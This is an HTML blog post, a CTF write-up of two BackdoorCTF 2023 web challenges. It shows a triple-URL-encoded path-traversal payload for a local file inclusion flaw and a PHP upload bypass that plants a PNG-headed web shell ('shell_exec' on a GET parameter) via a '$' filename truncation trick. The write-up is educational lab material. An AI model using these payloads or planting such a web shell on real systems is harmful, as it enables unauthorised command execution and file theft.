@@ -1,0 +1,358 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="BackdoorCTF 2023Web&#x2F;Beginner&#x2F;Secret_of_jackalChallenge OverviewDescription: I left a message for you. You will love it definitely Author: j4ck4l :&gt;)  We have been given a website. It’s a">
+<meta property="og:type" content="article">
+<meta property="og:title" content="BackDoorCTF 2023 Writeup">
+<meta property="og:url" content="http://j4ck4l-24.github.io/2024/05/14/BackDoorCTF23_Web_Writeup/index.html">
+<meta property="og:site_name" content="j4ck4l&#39;s Blog">
+<meta property="og:description" content="BackdoorCTF 2023Web&#x2F;Beginner&#x2F;Secret_of_jackalChallenge OverviewDescription: I left a message for you. You will love it definitely Author: j4ck4l :&gt;)  We have been given a website. It’s a">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://j4ck4l-24.github.io/images/backdoorctf23/secret/index.png">
+<meta property="og:image" content="http://j4ck4l-24.github.io/images/backdoorctf23/secret/flag.png">
+<meta property="og:image" content="http://j4ck4l-24.github.io/images/backdoorctf23/php/index.png">
+<meta property="og:image" content="http://j4ck4l-24.github.io/images/backdoorctf23/php/error1.png">
+<meta property="og:image" content="http://j4ck4l-24.github.io/images/backdoorctf23/php/error2.png">
+<meta property="og:image" content="http://j4ck4l-24.github.io/images/backdoorctf23/php/flag.png">
+<meta property="article:published_time" content="2024-05-14T10:20:19.793Z">
+<meta property="article:modified_time" content="2024-05-14T10:20:19.793Z">
+<meta property="article:author" content="j4ck4l">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://j4ck4l-24.github.io/images/backdoorctf23/secret/index.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>BackDoorCTF 2023 Writeup</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 7.2.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Blogs</a></li><!--
+     --><!--
+       --><li><a target="_blank" rel="noopener" href="http://github.com/j4ck4l-24">Projects</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/2024/05/14/UMassCTF24_Writeup/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://j4ck4l-24.github.io/2024/05/14/BackDoorCTF23_Web_Writeup/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://j4ck4l-24.github.io/2024/05/14/BackDoorCTF23_Web_Writeup/&text=BackDoorCTF 2023 Writeup"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://j4ck4l-24.github.io/2024/05/14/BackDoorCTF23_Web_Writeup/&title=BackDoorCTF 2023 Writeup"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://j4ck4l-24.github.io/2024/05/14/BackDoorCTF23_Web_Writeup/&is_video=false&description=BackDoorCTF 2023 Writeup"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=BackDoorCTF 2023 Writeup&body=Check out this article: http://j4ck4l-24.github.io/2024/05/14/BackDoorCTF23_Web_Writeup/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://j4ck4l-24.github.io/2024/05/14/BackDoorCTF23_Web_Writeup/&title=BackDoorCTF 2023 Writeup"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://j4ck4l-24.github.io/2024/05/14/BackDoorCTF23_Web_Writeup/&title=BackDoorCTF 2023 Writeup"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://j4ck4l-24.github.io/2024/05/14/BackDoorCTF23_Web_Writeup/&title=BackDoorCTF 2023 Writeup"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://j4ck4l-24.github.io/2024/05/14/BackDoorCTF23_Web_Writeup/&title=BackDoorCTF 2023 Writeup"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://j4ck4l-24.github.io/2024/05/14/BackDoorCTF23_Web_Writeup/&name=BackDoorCTF 2023 Writeup&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://j4ck4l-24.github.io/2024/05/14/BackDoorCTF23_Web_Writeup/&t=BackDoorCTF 2023 Writeup"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    
+    
+      <div id="toc">
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#BackdoorCTF-2023"><span class="toc-number">1.</span> <span class="toc-text">BackdoorCTF 2023</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Web-Beginner-Secret-of-jackal"><span class="toc-number">2.</span> <span class="toc-text">Web&#x2F;Beginner&#x2F;Secret_of_jackal</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Challenge-Overview"><span class="toc-number">2.1.</span> <span class="toc-text">Challenge Overview</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Vulnerability-Identification"><span class="toc-number">2.2.</span> <span class="toc-text">Vulnerability Identification</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Exploiting-the-Vulnerability"><span class="toc-number">2.3.</span> <span class="toc-text">Exploiting the Vulnerability</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Obtaining-the-Flag"><span class="toc-number">2.4.</span> <span class="toc-text">Obtaining the Flag</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Web-php-sucks"><span class="toc-number">3.</span> <span class="toc-text">Web&#x2F;php_sucks</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Challenge-Overview-1"><span class="toc-number">3.1.</span> <span class="toc-text">Challenge Overview</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Vulnerability-Identification-1"><span class="toc-number">3.2.</span> <span class="toc-text">Vulnerability Identification</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Exploiting-the-Vulnerability-1"><span class="toc-number">3.3.</span> <span class="toc-text">Exploiting the Vulnerability</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Obtaining-the-Flag-1"><span class="toc-number">3.4.</span> <span class="toc-text">Obtaining the Flag</span></a></li></ol></li></ol>
+      </div>
+    
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        BackDoorCTF 2023 Writeup
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">j4ck4l</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2024-05-14T10:20:19.793Z" class="dt-published" itemprop="datePublished">2024-05-14</time>
+        
+      
+    </div>
+
+
+      
+
+      
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <h1 id="BackdoorCTF-2023"><a href="#BackdoorCTF-2023" class="headerlink" title="BackdoorCTF 2023"></a>BackdoorCTF 2023</h1><h1 id="Web-Beginner-Secret-of-jackal"><a href="#Web-Beginner-Secret-of-jackal" class="headerlink" title="Web&#x2F;Beginner&#x2F;Secret_of_jackal"></a>Web&#x2F;Beginner&#x2F;Secret_of_jackal</h1><h2 id="Challenge-Overview"><a href="#Challenge-Overview" class="headerlink" title="Challenge Overview"></a>Challenge Overview</h2><p>Description: I left a message for you. You will love it definitely</p>
+<p>Author: j4ck4l :&gt;)</p>
+<p><img src="/./images/backdoorctf23/secret/index.png" alt="Index"></p>
+<p>We have been given a <a target="_blank" rel="noopener" href="http://35.222.114.240:8003/">website</a>. It’s a simple lfi challenge</p>
+<p>Hmm so to understand the functionality more let’s see the source code</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">ignore_it</span>(<span class="params">file_param</span>):</span><br><span class="line">    yoooo = file_param.replace(<span class="string">&#x27;.&#x27;</span>, <span class="string">&#x27;&#x27;</span>).replace(<span class="string">&#x27;/&#x27;</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> yoooo != file_param:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Illegal characters detected in file parameter!&quot;</span></span><br><span class="line">    <span class="keyword">return</span> yoooo</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">another_useless_function</span>(<span class="params">file_param</span>):</span><br><span class="line">    <span class="keyword">return</span> urllib.parse.unquote(file_param)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">url_encode_path</span>(<span class="params">file_param</span>):</span><br><span class="line">    <span class="keyword">return</span> urllib.parse.quote(file_param, safe=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">useless</span> (file_param):</span><br><span class="line">    file_param1 = ignore_it(file_param)</span><br><span class="line">    file_param2 = another_useless_function(file_param1)</span><br><span class="line">    file_param3 = ignore_it(file_param2)</span><br><span class="line">    file_param4 = another_useless_function(file_param3)</span><br><span class="line">    file_param5 = another_useless_function(file_param4)</span><br><span class="line">    <span class="keyword">return</span> file_param5</span><br></pre></td></tr></table></figure>
+
+
+<h2 id="Vulnerability-Identification"><a href="#Vulnerability-Identification" class="headerlink" title="Vulnerability Identification"></a>Vulnerability Identification</h2><p>Okay so let’s analyse it block by block.</p>
+<p>It’s a simple page which include local files. So if you try to read flag file which is one directory back as given in the Dockerfile it will give you a message which says <code>&quot;Illegal characters detected in file parameter!&quot;</code></p>
+<p>So if we see the code the <code>useless()</code> first sanatise the output using <code>ignore_it()</code> function and will remove the <code>/ &amp; .</code> characters and then url decodes it using <code>another_useless_function</code></p>
+<h2 id="Exploiting-the-Vulnerability"><a href="#Exploiting-the-Vulnerability" class="headerlink" title="Exploiting the Vulnerability"></a>Exploiting the Vulnerability</h2><p>If you execute this code locally if you encode the file path 2 times it should give you the flag but it will not run on the server.</p>
+<p>Because chrome already decodes the url 1 time and then 2 times it will be done by our code so in total 3 times we have to encode the file path.</p>
+<p>So our final payload is <code>%25252E%25252E%25252Fflag%25252Etxt</code></p>
+<h2 id="Obtaining-the-Flag"><a href="#Obtaining-the-Flag" class="headerlink" title="Obtaining the Flag"></a>Obtaining the Flag</h2><p>So after giving the payload you will get the flag</p>
+<p><img src="/./images/backdoorctf23/secret/flag.png" alt="Flag"></p>
+<p>Flag: <strong>flag{s1mp13_l0c4l_f1l3_1nclus10n_0dg4af52gav}</strong></p>
+<h1 id="Web-php-sucks"><a href="#Web-php-sucks" class="headerlink" title="Web&#x2F;php_sucks"></a>Web&#x2F;php_sucks</h1><h2 id="Challenge-Overview-1"><a href="#Challenge-Overview-1" class="headerlink" title="Challenge Overview"></a>Challenge Overview</h2><p>Description: I hate PHP, and I know you hate PHP too. So, to irritate you, here is your PHP webapp. Go play with it. </p>
+<p>Author: j4ck4l :&gt;)</p>
+<p><img src="/./images/backdoorctf23/php/index.png" alt="Index"></p>
+<p>We have been given a <a target="_blank" rel="noopener" href="http://35.222.114.240:8002/chal/upload.php">website</a>. We can see a simple upload form.</p>
+<p>Let’s try to upload a text file. And the server responds with <code>File size should be less than 200KB, and only png, jpeg, and jpg are alloweded</code></p>
+<p><img src="/./images/backdoorctf23/php/error1.png" alt="error1"></p>
+<p>Hmm so to understand the functionality more let’s see the source code</p>
+<p>The code is obfuscated and in a single line, let’s use an online beautifier and we get the below source code</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="variable">$allowedExtensions</span> = [<span class="string">&quot;jpg&quot;</span>, <span class="string">&quot;jpeg&quot;</span>, <span class="string">&quot;png&quot;</span>];</span><br><span class="line"><span class="variable">$errorMsg</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="keyword">if</span> (</span><br><span class="line">    <span class="variable">$_SERVER</span>[<span class="string">&quot;REQUEST_METHOD&quot;</span>] === <span class="string">&quot;POST&quot;</span> &amp;&amp;</span><br><span class="line">    <span class="keyword">isset</span>(<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>]) &amp;&amp;</span><br><span class="line">    <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&quot;name&quot;</span>])</span><br><span class="line">) &#123;</span><br><span class="line">    <span class="variable">$userName</span> = <span class="variable">$_POST</span>[<span class="string">&quot;name&quot;</span>];</span><br><span class="line">    <span class="variable">$uploadDir</span> = <span class="string">&quot;uploaded/&quot;</span> . <span class="title function_ invoke__">generateHashedDirectory</span>(<span class="variable">$userName</span>) . <span class="string">&quot;/&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="title function_ invoke__">is_dir</span>(<span class="variable">$uploadDir</span>)) &#123;</span><br><span class="line">        <span class="title function_ invoke__">mkdir</span>(<span class="variable">$uploadDir</span>, <span class="number">0750</span>, <span class="literal">true</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$uploadedFile</span> = <span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>];</span><br><span class="line">    <span class="variable">$fileName</span> = <span class="variable">$uploadedFile</span>[<span class="string">&quot;name&quot;</span>];</span><br><span class="line">    <span class="variable">$fileTmpName</span> = <span class="variable">$uploadedFile</span>[<span class="string">&quot;tmp_name&quot;</span>];</span><br><span class="line">    <span class="variable">$fileError</span> = <span class="variable">$uploadedFile</span>[<span class="string">&quot;error&quot;</span>];</span><br><span class="line">    <span class="variable">$fileSize</span> = <span class="variable">$uploadedFile</span>[<span class="string">&quot;size&quot;</span>];</span><br><span class="line">    <span class="variable">$fileExt</span> = <span class="title function_ invoke__">strtolower</span>(<span class="title function_ invoke__">pathinfo</span>(<span class="variable">$fileName</span>, PATHINFO_EXTENSION));</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">in_array</span>(<span class="variable">$fileExt</span>, <span class="variable">$allowedExtensions</span>) &amp;&amp; <span class="variable">$fileSize</span> &lt; <span class="number">200000</span>) &#123;</span><br><span class="line">        <span class="variable">$fileName</span> = <span class="title function_ invoke__">urldecode</span>(<span class="variable">$fileName</span>);</span><br><span class="line">        <span class="variable">$fileInfo</span> = <span class="title function_ invoke__">finfo_open</span>(FILEINFO_MIME_TYPE);</span><br><span class="line">        <span class="variable">$fileMimeType</span> = <span class="title function_ invoke__">finfo_file</span>(<span class="variable">$fileInfo</span>, <span class="variable">$fileTmpName</span>);</span><br><span class="line">        <span class="title function_ invoke__">finfo_close</span>(<span class="variable">$fileInfo</span>);</span><br><span class="line">        <span class="variable">$allowedMimeTypes</span> = [<span class="string">&quot;image/jpeg&quot;</span>, <span class="string">&quot;image/jpg&quot;</span>, <span class="string">&quot;image/png&quot;</span>];</span><br><span class="line">        <span class="variable">$fileName</span> = <span class="title function_ invoke__">strtok</span>(<span class="variable">$fileName</span>, <span class="title function_ invoke__">chr</span>(<span class="number">7841151584512418084</span>));</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">in_array</span>(<span class="variable">$fileMimeType</span>, <span class="variable">$allowedMimeTypes</span>)) &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="variable">$fileError</span> === UPLOAD_ERR_OK) &#123;</span><br><span class="line">                <span class="keyword">if</span> (<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$fileTmpName</span>, <span class="variable">$uploadDir</span> . <span class="variable">$fileName</span>)) &#123;</span><br><span class="line">                    <span class="title function_ invoke__">chmod</span>(<span class="variable">$uploadDir</span> . <span class="variable">$fileName</span>, <span class="number">0440</span>);</span><br><span class="line">                    <span class="keyword">echo</span> <span class="string">&quot;File uploaded successfully. &lt;a href=&#x27;<span class="subst">$uploadDir</span><span class="subst">$fileName</span>&#x27; target=&#x27;_blank&#x27;&gt;Open File&lt;/a&gt;&quot;</span>;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="variable">$errorMsg</span> = <span class="string">&quot;Error moving the uploaded file.&quot;</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="variable">$errorMsg</span> = <span class="string">&quot;File upload failed with error code: <span class="subst">$fileError</span>&quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$errorMsg</span> = <span class="string">&quot;Don&#x27;t try to fool me, this is not a png file&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$errorMsg</span> =</span><br><span class="line">            <span class="string">&quot;File size should be less than 200KB, and only png, jpeg, and jpg are allowed&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">generateHashedDirectory</span>(<span class="params"><span class="variable">$userName</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$randomSalt</span> = <span class="title function_ invoke__">bin2hex</span>(<span class="title function_ invoke__">random_bytes</span>(<span class="number">16</span>));</span><br><span class="line">    <span class="variable">$hashedDirectory</span> = <span class="title function_ invoke__">hash</span>(<span class="string">&quot;sha256&quot;</span>, <span class="variable">$userName</span> . <span class="variable">$randomSalt</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$hashedDirectory</span>;</span><br><span class="line">&#125; <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+
+<h2 id="Vulnerability-Identification-1"><a href="#Vulnerability-Identification-1" class="headerlink" title="Vulnerability Identification"></a>Vulnerability Identification</h2><p>Okay so let’s analyse it block by block.</p>
+<p>It first asks for a file and then it checks the file extension using </p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$fileExt</span> = <span class="title function_ invoke__">strtolower</span>(<span class="title function_ invoke__">pathinfo</span>(<span class="variable">$fileName</span>, PATHINFO_EXTENSION));</span><br><span class="line"> <span class="keyword">if</span> (<span class="title function_ invoke__">in_array</span>(<span class="variable">$fileExt</span>, <span class="variable">$allowedExtensions</span>) &amp;&amp; <span class="variable">$fileSize</span> &lt; <span class="number">200000</span>)</span><br><span class="line"> ....... continued</span><br></pre></td></tr></table></figure>
+<p>so if the extension is <code>jpg, jpeg, png</code> and the file size is less than 200kb it will try to execute further instructions.</p>
+<p>Okay then if you pass the extension check we have another check that is the MIME type check. So if you try to fool the server by uploading a file like <code>exploit.php.png</code> but the file type is actually a <code>php</code> then the server will give you and error –&gt; <code>Don&#39;t try to fool me, this is not a png file</code>.</p>
+<p><img src="/./images/backdoorctf23/php/error2.png" alt="error2"></p>
+<p>Okay so let’s try to upload a file with the header <code>png/jpeg/jpg</code> </p>
+<p>We can do it with a file using <code>xxd -r -p -o 0 &lt;(echo 8950 4e47 0d0a 1a0a 0000 000d 4948 4452) exploit.php.png</code></p>
+<p>So if you check the file type now it will bypass the MIME check.</p>
+<p>But the problem is if it is uploaded it will be uploaded as exploit.php.png so an image will open so it is not helpful to solve the challenge</p>
+<h2 id="Exploiting-the-Vulnerability-1"><a href="#Exploiting-the-Vulnerability-1" class="headerlink" title="Exploiting the Vulnerability"></a>Exploiting the Vulnerability</h2><p>So to exploit this we will set the header of the file to <strong>PNG</strong>. And then we will inject some php code to exploit the server.</p>
+<p>We will name this file as <code>exploit.php%00.png</code>. The nullbyte will bypass the checks performed and the name of the file which will be uploaded on the server will be exploit.php as it will ignore the part after the nullbyte.</p>
+<p>But here is a twist.</p>
+<p>Have a look at this line of code </p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$fileName</span> = <span class="title function_ invoke__">strtok</span>(<span class="variable">$fileName</span>, <span class="title function_ invoke__">chr</span>(<span class="number">7841151584512418084</span>));</span><br></pre></td></tr></table></figure>
+
+<p>if you use php interactive shell you can see the <code>chr(7841151584512418084)</code> </p>
+<figure class="highlight openscad"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">php &gt; <span class="built_in">echo</span> <span class="built_in">chr</span>(<span class="number">7841151584512418084</span>);</span><br><span class="line">$</span><br><span class="line">php &gt; <span class="built_in">echo</span> urlencode(<span class="built_in">chr</span>(<span class="number">7841151584512418084</span>));</span><br><span class="line">%<span class="number">24</span></span><br></pre></td></tr></table></figure>
+<p>so the file name will be split by $.</p>
+<p>So to exploit this we will create a file <code>exploit.php%24.png</code> or <code>exploit.php$.png</code> with header of png and content as </p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">�PNG</span><br><span class="line">^Z</span><br><span class="line">^@^@^@^MIHDR<span class="meta">&lt;?php</span> <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>])) &#123; <span class="keyword">echo</span> <span class="title function_ invoke__">shell_exec</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]); &#125; <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="Obtaining-the-Flag-1"><a href="#Obtaining-the-Flag-1" class="headerlink" title="Obtaining the Flag"></a>Obtaining the Flag</h2><p>So we will upload the file and the file name which will be uploaded will be <code>exploit.php</code> and when we open the file . BOOM we got the shell</p>
+<p>let’s do rce now and list the files two directories back we get the name of flag file as <code>s0_7h15_15_7h3_fl496_y0u_ar3_54rch1n9_f0r.txt</code></p>
+<p>and now <code>cat ../../s0_7h15_15_7h3_fl496_y0u_ar3_54rch1n9_f0r.txt</code> to read the file.</p>
+<p><img src="/./images/backdoorctf23/php/flag.png" alt="Flag"> </p>
+<p>Flag: <strong>flag{n0t_3v3ry_t1m3_y0u_w1ll_s33_nu11byt3_vuln3r4b1l1ty_0sdfdgh554fd}</strong></p>
+<p>Thank You</p>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">Home</a></li>
+        
+          <li><a href="/about/">About</a></li>
+        
+          <li><a href="/archives/">Blogs</a></li>
+        
+          <li><a target="_blank" rel="noopener" href="http://github.com/j4ck4l-24">Projects</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <div id="toc-footer" style="display: none">
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#BackdoorCTF-2023"><span class="toc-number">1.</span> <span class="toc-text">BackdoorCTF 2023</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Web-Beginner-Secret-of-jackal"><span class="toc-number">2.</span> <span class="toc-text">Web&#x2F;Beginner&#x2F;Secret_of_jackal</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Challenge-Overview"><span class="toc-number">2.1.</span> <span class="toc-text">Challenge Overview</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Vulnerability-Identification"><span class="toc-number">2.2.</span> <span class="toc-text">Vulnerability Identification</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Exploiting-the-Vulnerability"><span class="toc-number">2.3.</span> <span class="toc-text">Exploiting the Vulnerability</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Obtaining-the-Flag"><span class="toc-number">2.4.</span> <span class="toc-text">Obtaining the Flag</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Web-php-sucks"><span class="toc-number">3.</span> <span class="toc-text">Web&#x2F;php_sucks</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Challenge-Overview-1"><span class="toc-number">3.1.</span> <span class="toc-text">Challenge Overview</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Vulnerability-Identification-1"><span class="toc-number">3.2.</span> <span class="toc-text">Vulnerability Identification</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Exploiting-the-Vulnerability-1"><span class="toc-number">3.3.</span> <span class="toc-text">Exploiting the Vulnerability</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Obtaining-the-Flag-1"><span class="toc-number">3.4.</span> <span class="toc-text">Obtaining the Flag</span></a></li></ol></li></ol>
+      </div>
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://j4ck4l-24.github.io/2024/05/14/BackDoorCTF23_Web_Writeup/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
